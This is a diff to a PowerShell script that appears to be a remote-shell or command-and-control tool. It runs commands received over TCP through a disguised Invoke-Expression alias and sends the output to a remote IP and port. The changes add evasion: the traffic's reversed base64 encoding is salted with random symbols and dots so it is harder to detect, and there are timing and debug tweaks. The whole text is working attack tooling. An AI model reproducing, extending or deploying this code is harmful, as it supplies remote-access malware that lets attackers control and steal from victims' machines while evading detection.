@@ -50,6 +50,7 @@ $Chunk = $args[4]
 $Alias1 = "Invoke" ; $Alias2 = "Express"
 Set-Alias sh -value "$Alias1-$Alias2`ion"
 if ($OSVersion -like "*Win*") { $localslash = "\" } else { $localslash = "/" } 
+$symbols = '.........".$.}.{.>.<.*.%.;.:./.\.(.).@.~.=.].[.!.?.^.&.#.|.........'
 
 # Functions
 function GetChunk {
@@ -61,19 +62,28 @@ function SendChunk {
 try { $writer.WriteLine($args[0])
 $writer.Close() ; $tcpConnection.Close()}
 catch { $tcpConnection = New-Object System.Net.Sockets.TcpClient("$IP", "$Port")
-$tcpStream = $tcpConnection.GetStream()
+$tcpStream = $tcpConnection.GetStream() ; Start-Sleep -milliseconds 500
 $writer = New-Object System.IO.StreamWriter($tcpStream)
 $writer.WriteLine($args[0])
 $writer.Close() ; $tcpConnection.Close()}}
 
-function R64Encoder { 
+function R64Encoder {
 if ($args[0] -eq "-t") { $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
 if ($args[0] -eq "-f") { $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
 $base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "-") ; $base64 = $base64.Replace("/", "_")
-$revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64 ; return $R64Base }
+$revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64
+$Rand64 = (($R64Base -split "(.{$(Get-Random(2..3))})" -ne "" | % { 
+$randomIndex = Get-Random -Minimum 0 -Maximum ($symbols.Length) ; Write-Output $("." * $(Get-Random -Minimum 1 -Maximum 7))
+$symbols[$randomIndex] + $_ + $($randomIndex = Get-Random -Minimum 0 -Maximum ($symbols.Length)
+$symbols[$randomIndex]) }) -join "").toString() ; return $Rand64 }
+
+function ReplaceSymbols($text) {
+$symbols.ToCharArray() | ForEach-Object {
+$text = $text.Replace("$_", ",")} ; $text }
 
 function R64Decoder {
 $base64 = $args[1].ToCharArray() ; [array]::Reverse($base64) ; $base64 = -join $base64
+$base64 = ReplaceSymbols $base64 ; $base64 = [string]$base64.Replace(",", "")
 $base64 = [string]$base64.Replace("-", "+") ; $base64 = [string]$base64.Replace("_", "/")
 switch ($base64.Length % 4) { 0 { break } ; 2 { $base64 += "=="; break } ; 3 { $base64 += "="; break }}
 if ($args[0] -eq "-t") { $revb64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) ; $revb64 }
@@ -120,6 +130,7 @@ if ($OSVersion -notlike "*Win*") { if ($remoteslash -eq "\") { $path = $path.rep
 if ($command -eq "exit") { $PSexit = "True" } ; if ($command -eq $null) { Write-Host }}
 
 until ($command -ne $null) ; if ($command) { $command = R64Encoder -t $command }}
+if ($args -like "*-debug") { Write-Host "CMD: $command" }
 
 $stream.Write([text.Encoding]::Ascii.GetBytes($command), 0, $command.Length)
 $client.Close() ; $Listener.Stop()
@@ -132,6 +143,8 @@ $client = $Listener.AcceptTcpClient()
 $stream = $client.GetStream()
 $reader = New-Object System.IO.StreamReader($stream)
 $data = $reader.ReadLine()
+
+if ($args -like "*-debug") { Write-Host "DATA: $data" }
 
 if ($Start -eq "True") { $path = R64Decoder -t $data ; $Start = "False"
 $data = $null ; if ($path -like "*\*") { $remoteslash = "\" } else { $remoteslash = "/" }}
@@ -197,14 +210,15 @@ $out = R64Encoder -t "[+] Ready to upload!" ; $upload = "True" }
 
 elseif ($upload -eq "True") { $out = R64Encoder -t "[+] File uploaded!" ; $upload = "False" }
 elseif ($Start -eq "True") { $out = R64Encoder -t $pwd.Path ; $Start = "False" }
-elseif ($Multi -eq "True") { GetChunk $multiout | % { Start-Sleep -milliseconds 1200 ; SendChunk $_ ; SendChunk $_ } ; $Multi = "SendOut" }
+elseif ($Multi -eq "True") { GetChunk $multiout | % { Start-Sleep 1.2 ; SendChunk $_ ; SendChunk $_ } ; $Multi = "SendOut" }
 elseif ($Multi -eq "SendOut") { $out = R64Encoder -t "[+] MultiPart Data OK!" ; $Multi = "False" ; $multiout = $null }
+
 else { $out = $(sh "$cmd") | Out-String
-if ($args -like "*-debug") { Write-Host "OUT: $out" }
-if ($out -ne $null) { $out = R64Encoder -t $out }}
+if ($out -ne $null) { $out = R64Encoder -t $out } else { $out = R64Encoder -t $pwd.Path }}
 
 if ($Chunk) { if ($out.length -ge $Chunk) { $multiout = $out ; $Multi = "True"
 $out = R64Encoder -t "[+] Sending MultiPart Data.." }}
+if ($args -like "*-debug") { Write-Host "OUT: $(R64Decoder -t $out)" }
 
-if ($out) { $writer.WriteLine($out) } else { $out = R64Encoder -t $pwd.Path }
+$writer.WriteLine($out)
 $writer.Close() ; $tcpConnection.Close()}}
